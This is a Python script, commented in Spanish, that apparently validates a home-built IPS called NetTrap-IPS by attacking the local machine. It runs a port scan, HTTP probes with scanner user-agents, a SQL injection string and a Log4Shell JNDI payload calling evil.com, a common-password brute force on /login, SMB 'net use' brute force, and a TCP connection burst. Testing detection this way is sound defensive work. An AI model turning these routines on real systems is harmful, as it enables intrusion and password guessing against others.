"""
╔══════════════════════════════════════════════════════════════════╗
║  NetTrap-IPS · Script de Ataque REAL para Validación del IPS   ║
║  Genera tráfico de ataque genuino contra el servidor local     ║
║  para probar la detección, correlación y respuesta del SIEM.   ║
╚══════════════════════════════════════════════════════════════════╝

USO:
  1. Inicia el servidor:  start.bat  (como Administrador)
  2. Abre el Dashboard:   http://127.0.0.1:8000  (usuario: admin / clave: nettrap2026)
  3. En OTRO terminal:    python ataque_prueba.py

IMPORTANTE:
  - Este script conecta al servidor usando la IP de red local (NO localhost).
  - Así el middleware y los colectores ven una IP REAL que NO está en la whitelist.
  - El IPS detectará los ataques, generará alertas y bloqueará la IP atacante.
  - El bloqueo se levanta automáticamente después de 5 minutos.
  - El Dashboard (abierto vía 127.0.0.1) NO se ve afectado por el bloqueo.
"""

import socket
import time
import urllib.request
import urllib.error
import subprocess
import sys

# ─────────────────────────────────────────────────────────────────
# Utilidades
# ─────────────────────────────────────────────────────────────────
def get_local_ip():
    """Obtiene la IP local de red (la que sale hacia internet, NO 127.0.0.1)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()


def servidor_activo(ip, port=8000):
    """Verifica que el servidor NetTrap-IPS esté escuchando."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        ok = s.connect_ex((ip, port)) == 0
        s.close()
        return ok
    except Exception:
        return False


# ═════════════════════════════════════════════════════════════════
# FASE 1: Escaneo Rápido de Puertos (TCP Connect Scan)
# ═════════════════════════════════════════════════════════════════
# Cada conexión TCP exitosa al puerto 8000 (u otro abierto) genera
# una entrada en netstat con la IP de red como origen. El
# NetworkTrafficCollector del IPS detecta estas conexiones nuevas
# y las inyecta como eventos "network_traffic". Si se acumulan ≥4
# en 45 segundos, se dispara RULE-002 (Escaneo Nmap SYN).
# ─────────────────────────────────────────────────────────────────
def fase1_escaneo_puertos(target):
    print()
    print("─" * 60)
    print("  FASE 1 │ Escaneo Rápido de Puertos (TCP Connect Scan)")
    print("─" * 60)
    print(f"  Objetivo : {target}")
    print(f"  Puertos  : 20 puertos comunes (FTP, SSH, HTTP, SMB, RDP...)")
    print(f"  Regla IPS: RULE-002 (4 conexiones en 45s) / RULE-003 (Firewall DROP)")
    print()

    puertos = [
        (21,  "FTP"),    (22,  "SSH"),    (23,  "Telnet"),
        (25,  "SMTP"),   (53,  "DNS"),    (80,  "HTTP"),
        (110, "POP3"),   (135, "RPC"),    (139, "NetBIOS"),
        (443, "HTTPS"),  (445, "SMB"),    (993, "IMAPS"),
        (1433,"MSSQL"),  (3306,"MySQL"),  (3389,"RDP"),
        (5432,"PostgreSQL"), (5900,"VNC"),
        (8000,"NetTrap-SOC"), (8080,"HTTP-Alt"), (8443,"HTTPS-Alt"),
    ]

    abiertos = []
    for puerto, servicio in puertos:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            resultado = s.connect_ex((target, puerto))
            if resultado == 0:
                abiertos.append(puerto)
                print(f"    {puerto:>5}/tcp  OPEN       {servicio}")
            else:
                print(f"    {puerto:>5}/tcp  closed     {servicio}")
            s.close()
        except Exception:
            print(f"    {puerto:>5}/tcp  error      {servicio}")
        time.sleep(0.04)

    print(f"\n  >> {len(abiertos)} puertos abiertos encontrados: {abiertos}")
    return abiertos


# ═════════════════════════════════════════════════════════════════
# FASE 2: Sondeo HTTP Agresivo con User-Agents Maliciosos
# ═════════════════════════════════════════════════════════════════
# Cada petición HTTP al servidor vía la IP de red (no localhost)
# pasa por el middleware audit_external_traffic de main.py, que
# detecta User-Agents sospechosos (nmap, nikto, sqlmap, curl) y
# genera eventos "network_traffic" con severidad HIGH. Tras ≥4
# eventos se dispara RULE-002 o RULE-004.
# ─────────────────────────────────────────────────────────────────
def fase2_sondeo_http(target, port=8000):
    print()
    print("─" * 60)
    print("  FASE 2 │ Sondeo HTTP Agresivo (User-Agents Maliciosos)")
    print("─" * 60)
    print(f"  Objetivo : http://{target}:{port}")
    print(f"  Técnica  : Requests con firmas de Nmap, Nikto, sqlmap, etc.")
    print(f"  Regla IPS: RULE-002 / RULE-004 (4 eventos en 45-60s)")
    print()

    ataques = [
        ("Nmap Scripting Engine",                         "/",           "Reconocimiento Nmap NSE"),
        ("Nikto/2.1.6 (Evasions:1)",                     "/admin",      "Scanner Nikto"),
        ("sqlmap/1.7.12#stable (https://sqlmap.org)",     "/login?id=1' OR '1'='1", "Inyección SQL"),
        ("DirBuster-1.0-RC1 (http://www.owasp.org)",     "/.env",       "Exposición de secretos"),
        ("Gobuster/3.6",                                  "/wp-admin",   "CMS discovery"),
        ("curl/7.88.1",                                   "/api/status", "API probing"),
        ("python-requests/2.31.0",                        "/api/block",  "Endpoint sensible"),
        ("Nmap Scripting Engine",                         "/config.yml", "Config exposure"),
        ("Nikto/2.1.6",                                   "/backup.sql", "DB dump attempt"),
        ("Mozilla/5.0 ${jndi:ldap://evil.com/exploit}",  "/",           "Log4Shell JNDI probe"),
        ("sqlmap/1.7.12",                                 "/api/simulate","Fuzzing de API"),
        ("curl/8.0.0",                                    "/login",      "Endpoint auth recon"),
    ]

    for i, (ua, ruta, descripcion) in enumerate(ataques, 1):
        try:
            url = f"http://{target}:{port}{ruta}"
            req = urllib.request.Request(url, headers={"User-Agent": ua})
            res = urllib.request.urlopen(req, timeout=3)
            code = res.status
        except urllib.error.HTTPError as e:
            code = e.code
        except urllib.error.URLError:
            code = "CONN_REFUSED"
        except Exception:
            code = "TIMEOUT/BLOCKED"
        print(f"    [{i:>2}] {descripcion:25s} │ {ua[:35]:35s} │ {code}")
        time.sleep(0.12)

    print(f"\n  >> {len(ataques)} requests de sondeo enviados al servidor")


# ═════════════════════════════════════════════════════════════════
# FASE 3: Fuerza Bruta contra /login (Hydra-style)
# ═════════════════════════════════════════════════════════════════
# Envía múltiples intentos de autenticación con contraseñas
# comunes al endpoint /login. Cada petición POST genera un evento
# en el middleware Y activa el rate limiter interno de OWASP ASVS
# (bloqueo temporal tras 5 intentos fallidos durante 15 minutos).
# ─────────────────────────────────────────────────────────────────
def fase3_fuerza_bruta_login(target, port=8000):
    print()
    print("─" * 60)
    print("  FASE 3 │ Fuerza Bruta contra Login Web (Hydra-style)")
    print("─" * 60)
    print(f"  Objetivo : http://{target}:{port}/login")
    print(f"  Técnica  : Diccionario de contraseñas + User-Agent Hydra")
    print(f"  Regla IPS: RULE-004 + Rate Limiter OWASP (5 intentos = lockout)")
    print()

    credenciales = [
        ("admin",         "admin"),
        ("admin",         "password"),
        ("admin",         "123456"),
        ("admin",         "root"),
        ("admin",         "toor"),
        ("admin",         "admin123"),
        ("admin",         "letmein"),
        ("root",          "root"),
        ("administrator", "P@ssw0rd"),
        ("admin",         "qwerty123"),
        ("admin",         "changeme"),
        ("admin",         "master"),
        ("admin",         "hack3r"),
        ("sa",            "sa"),
        ("admin",         "nettrap"),
    ]

    for i, (user, pwd) in enumerate(credenciales, 1):
        try:
            data = f"username={user}&password={pwd}".encode()
            req = urllib.request.Request(
                f"http://{target}:{port}/login",
                data=data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Hydra/9.5 (https://github.com/vanhauser-thc/thc-hydra)"
                },
                method="POST"
            )
            res = urllib.request.urlopen(req, timeout=3)
            code = res.status
        except urllib.error.HTTPError as e:
            code = e.code
        except urllib.error.URLError:
            code = "BLOCKED"
        except Exception:
            code = "BLOCKED"

        if code == 429:
            estado = "RATE LIMITED (lockout 15 min)"
        elif code == 401:
            estado = "FAILED"
        elif code == "BLOCKED":
            estado = "IP BLOQUEADA por IPS"
        elif code == 200:
            estado = "SUCCESS (redirect)"
        else:
            estado = f"HTTP {code}"
        print(f"    [{i:>2}] {user}:{pwd:15s}  =>  {estado}")
        time.sleep(0.15)

    print(f"\n  >> {len(credenciales)} intentos de fuerza bruta ejecutados")


# ═════════════════════════════════════════════════════════════════
# FASE 4: Fuerza Bruta SMB (Genera EventID 4625 Real en Windows)
# ═════════════════════════════════════════════════════════════════
# Usa el comando nativo "net use" para intentar autenticarse al
# recurso compartido IPC$ del servidor con credenciales falsas.
# Cada intento fallido genera un EventID 4625 REAL en el log de
# seguridad de Windows (Security.evtx), que el colector
# WindowsEventLogCollector del IPS lee mediante wevtutil.
# Si se acumulan ≥5 fallos en 60s, se dispara RULE-001.
# ─────────────────────────────────────────────────────────────────
def fase4_fuerza_bruta_smb(target):
    print()
    print("─" * 60)
    print("  FASE 4 │ Fuerza Bruta SMB (EventID 4625 Real en Windows)")
    print("─" * 60)
    print(f"  Objetivo : \\\\{target}\\IPC$")
    print(f"  Técnica  : net use con credenciales inválidas")
    print(f"  Regla IPS: RULE-001 (5 fallos de login en 60s)")
    print()

    usuarios = [
        "administrator", "admin", "root", "guest",
        "backup", "service", "sa", "test", "user", "hacker"
    ]

    for i, user in enumerate(usuarios, 1):
        try:
            cmd = [
                "net", "use", f"\\\\{target}\\IPC$",
                f"/user:{user}", "WrongP@ss123!",
                "/persistent:no"
            ]
            result = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=5, check=False
            )
            # Limpiar cualquier conexión residual
            subprocess.run(
                ["net", "use", f"\\\\{target}\\IPC$", "/delete", "/y"],
                capture_output=True, timeout=3, check=False
            )

            if result.returncode == 0:
                estado = "ACCESS GRANTED (!)"
            elif "86" in result.stderr or "1326" in result.stderr:
                estado = "LOGON FAILURE  ->  EventID 4625 generado"
            elif "53" in result.stderr:
                estado = "NETWORK PATH NOT FOUND"
            elif "64" in result.stderr:
                estado = "NETWORK NAME DELETED"
            else:
                estado = f"ERROR (code {result.returncode})"
        except subprocess.TimeoutExpired:
            estado = "TIMEOUT"
        except Exception as e:
            estado = f"ERROR: {e}"

        print(f"    [{i:>2}] {user}:WrongP@ss123!   =>  {estado}")
        time.sleep(0.3)

    print(f"\n  >> {len(usuarios)} intentos de fuerza bruta SMB ejecutados")


# ═════════════════════════════════════════════════════════════════
# FASE 5: Ráfaga TCP Final (SYN Flood Controlado)
# ═════════════════════════════════════════════════════════════════
# Abre y cierra rápidamente muchas conexiones TCP al puerto del
# servidor (8000), generando una ráfaga de conexiones que el
# colector de red detecta como patrón de escaneo.
# ─────────────────────────────────────────────────────────────────
def fase5_rafaga_tcp(target, port=8000):
    print()
    print("─" * 60)
    print("  FASE 5 │ Ráfaga TCP (SYN Flood Controlado)")
    print("─" * 60)
    print(f"  Objetivo : {target}:{port}")
    print(f"  Técnica  : Apertura/cierre rápido de 30 conexiones TCP")
    print(f"  Regla IPS: RULE-002 (ráfaga de conexiones entrantes)")
    print()

    exitosas = 0
    fallidas = 0
    for i in range(30):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((target, port)) == 0:
                # Enviar un byte basura para que la conexión se registre
                try:
                    s.sendall(b"X")
                except Exception:
                    pass
                exitosas += 1
            else:
                fallidas += 1
            s.close()
        except Exception:
            fallidas += 1
        time.sleep(0.03)

    print(f"    >> Conexiones exitosas: {exitosas}")
    print(f"    >> Conexiones fallidas: {fallidas}")
    print(f"\n  >> Ráfaga TCP completada: {exitosas + fallidas} conexiones en ~1 segundo")


# ═════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════
def main():
    print()
    print("╔════════════════════════════════════════════════════════════╗")
    print("║  SCRIPT DE ATAQUE REAL · VALIDACIÓN NETTRAP-IPS          ║")
    print("║  Equipo CyberDefender — Prueba de Penetración Real      ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print()

    target = get_local_ip()
    if not target:
        print("  [ERROR] No se pudo detectar la IP de red local.")
        sys.exit(1)

    print(f"  IP del objetivo (este equipo en la red): {target}")
    print(f"  Hora de inicio: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    # Verificar que el servidor está corriendo
    if not servidor_activo(target, 8000):
        print(f"  [ERROR] El servidor NetTrap-IPS NO responde en {target}:8000")
        print()
        print("  Antes de ejecutar este script:")
        print("    1. Abre un terminal como Administrador")
        print("    2. Ejecuta:  start.bat")
        print("    3. Espera a ver 'Uvicorn running on http://0.0.0.0:8000'")
        print("    4. Abre el Dashboard en:  http://127.0.0.1:8000")
        print("    5. Ejecuta este script en OTRO terminal")
        sys.exit(1)

    print(f"  [OK] Servidor NetTrap-IPS activo en {target}:8000")
    print()
    print("  ADVERTENCIA:")
    print("  - Este script genera tráfico de ataque REAL contra el IPS.")
    print("  - El IPS bloqueará la IP de este equipo temporalmente (5 min).")
    print("  - Tu Dashboard (abierto en http://127.0.0.1:8000) NO se afecta.")
    print("  - Mira la consola del servidor y el Dashboard mientras corre.")
    print()

    input("  >>> Presiona ENTER para iniciar el ataque... ")

    t0 = time.time()

    fase1_escaneo_puertos(target)
    print("\n  [*] Esperando 2 segundos para que el IPS procese...\n")
    time.sleep(2)

    fase2_sondeo_http(target)
    print("\n  [*] Esperando 2 segundos...\n")
    time.sleep(2)

    fase3_fuerza_bruta_login(target)
    print("\n  [*] Esperando 2 segundos...\n")
    time.sleep(2)

    fase4_fuerza_bruta_smb(target)
    print("\n  [*] Esperando 2 segundos...\n")
    time.sleep(2)

    fase5_rafaga_tcp(target)

    duracion = time.time() - t0

    print()
    print("═" * 60)
    print("  ATAQUE COMPLETADO")
    print("═" * 60)
    print(f"  Duración total     : {duracion:.1f} segundos")
    print(f"  IP del atacante    : {target}")
    print(f"  Hora de fin        : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    print("  QUÉ DEBERÍAS VER EN EL DASHBOARD (http://127.0.0.1:8000):")
    print()
    print("    RULE-002  Escaneo Rápido de Reconocimiento de Red")
    print("              -> Disparado por el port scan y ráfaga TCP")
    print()
    print("    RULE-004  Sondeo Anómalo de Servicios Web (Log4Shell)")
    print("              -> Disparado por las requests HTTP con Nmap/Nikto/sqlmap")
    print()
    print("    RULE-001  Fuerza Bruta de Autenticación Windows (4625)")
    print("              -> Disparado por los intentos SMB fallidos")
    print()
    print("    RULE-003  Violación Reiterada de Políticas en Firewall")
    print("              -> Disparado por paquetes DROP (si corre como admin)")
    print()
    print("    IP EN CUARENTENA con temporizador de 300 seg")
    print("    ARCHIVOS .pcap generados en src/data/pcap/")
    print("═" * 60)


if __name__ == "__main__":
    main()
